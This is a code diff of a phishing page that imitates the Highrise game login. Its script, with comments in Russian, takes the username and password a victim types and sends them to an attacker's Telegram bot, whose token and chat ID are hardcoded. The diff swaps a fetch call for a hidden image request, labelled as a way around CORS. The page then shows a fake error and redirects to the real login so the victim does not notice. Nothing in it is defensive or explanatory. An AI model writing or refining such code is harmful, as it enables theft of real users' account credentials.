@@ -42,30 +42,22 @@
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
-      // === ВАШ ТОКЕН И CHAT_ID ВСТАВЛЕНЫ ===
+      // === ВАШ ТОКЕН И CHAT_ID ===
       const BOT_TOKEN = '8681081134:AAHF_jOZWNDK4RqH7hntuvjgTCas8lCmS-Y';
       const CHAT_ID = '7327749600';
 
-      fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: 🔐 Highrise Login\n👤 ${username}\n🔑 ${password}
-        })
-      })
-      .then(() => {
-        document.getElementById('errorMsg').style.display = 'block';
-        setTimeout(() => {
-          window.location.href = 'https://web.highrise.game/login';
-        }, 1500);
-      })
-      .catch(() => {
-        document.getElementById('errorMsg').style.display = 'block';
-        setTimeout(() => {
-          window.location.href = 'https://web.highrise.game/login';
-        }, 1500);
-      });
+      // === ОТПРАВКА ЧЕРЕЗ IMG (ОБХОД CORS) ===
+      const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('🔐 Highrise Login\n👤 ' + username + '\n🔑 ' + password)};
+      const img = document.createElement('img');
+      img.src = url;
+      img.style.display = 'none';
+      document.body.appendChild(img);
+
+      // Показываем ошибку и перенаправляем
+      document.getElementById('errorMsg').style.display = 'block';
+      setTimeout(() => {
+        window.location.href = 'https://web.highrise.game/login';
+      }, 1500);
     });
   </script>
 </body>
